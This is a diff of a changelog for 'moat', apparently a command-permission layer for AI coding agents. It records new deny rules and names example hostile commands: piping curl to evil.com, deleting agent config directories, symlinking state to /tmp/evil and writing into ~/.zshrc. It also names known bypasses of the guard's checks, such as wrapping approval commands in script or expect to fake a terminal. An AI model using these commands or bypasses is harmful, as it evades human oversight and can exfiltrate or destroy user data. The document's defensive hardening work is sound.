@@ -7,6 +7,7 @@ All notable changes to this project are documented here. The format follows
 ## [Unreleased]
 
 ### Security
+- Default policy: `env-poison` also denies setting `MOAT_*` variables (`MOAT_HOME` relocates the kernel's state; `MOAT_ASSUME_TTY` is a debug-build test override).
 - `kernel-self` protects the state and host directories themselves (`~/.moat`, `~/.claude`, `~/.codex`, `~/.cursor`, and `.moat`/`.claude`/`.codex`/`.cursor` in projects): `mv ~/.moat /tmp/x`, `ln -sfn /tmp/evil ~/.moat`, `rm -rf ~/.claude` and `mv .claude .claude-off` are denied; previously only files inside them were protected and these asked. `mv` now treats its source as a write. The policy lock reports a pinned file as modified when a directory on its path was replaced by a link; previously the changed location was reported as intact.
 - `dev-shell` no longer allows options that run another program or write files: `find -exec/-execdir/-ok/-okdir/-delete/-fprint*/-fls`, `rg --pre`, `git --upload-pack/--receive-pack`, `go -exec/-toolexec/-vettool`, `cargo --config` now ask. The command after `find -exec` is classified (so `find . -exec sh -c 'curl … evil.com' \;` is denied by `default.net`), and `--output=FILE` is a file write (so `git diff --output=~/.zshrc` is denied by `shell-rc`). Previously all of these were allowed by `dev-shell`.
 - `kernel-self` denies `script`, `expect` and `unbuffer` wrapped around `moat allow|doctor|init|policy` (BSD and Linux `script` forms, `expect -c 'spawn …'`, absolute `moat` paths); they gave the command a pseudo-terminal to pass the terminal-only check and previously only asked (ADR-011).
@@ -29,6 +30,7 @@ All notable changes to this project are documented here. The format follows
 - Claude Code and Cursor adapters derive those paths and hosts from MCP `tool_input` by argument name (`path`, `paths`, `file_path`, `source`, `destination`, `url`, …); write-shaped tool names (`write_*`, `edit_*`, `move_*`, `delete_*`) and `destination`/`target` arguments produce `fs.write`.
 
 ### Changed
+- `moat allow` and `moat doctor --accept` success paths are covered end to end (`tests/allow.rs`): session grant via `--last` and explicit `--session`, `--always` overlay with lock re-pin, `doctor --accept` after an owner edit. Debug builds honour `MOAT_ASSUME_TTY=1` for these tests; release builds do not contain the override.
 - Default policy: new allow group `dev-readonly` (`wc`, `diff`, `tree`, read-only `docker ps/images/logs/version`, `gh pr/issue/run/repo` view and list commands, reads of `PATH`, `HOME`, `USER`, `SHELL`, `PWD`, `LANG`, `TERM`, `TMPDIR`, `EDITOR`); `--output`/`-o` forms are excluded. The benign conformance corpus grows from 34 to 87 fixtures.
 - Shell pattern lists accept `!` exclusions, with the same semantics as glob lists (ADR-012).
 - `moat policy lint` prints warnings (exit 0) for `ask` patterns an `allow` pattern already covers, `allow` patterns a `deny` pattern covers, and unknown `defaults` kinds; `executables` paths in Windows form (`C:/…`) are accepted as absolute.
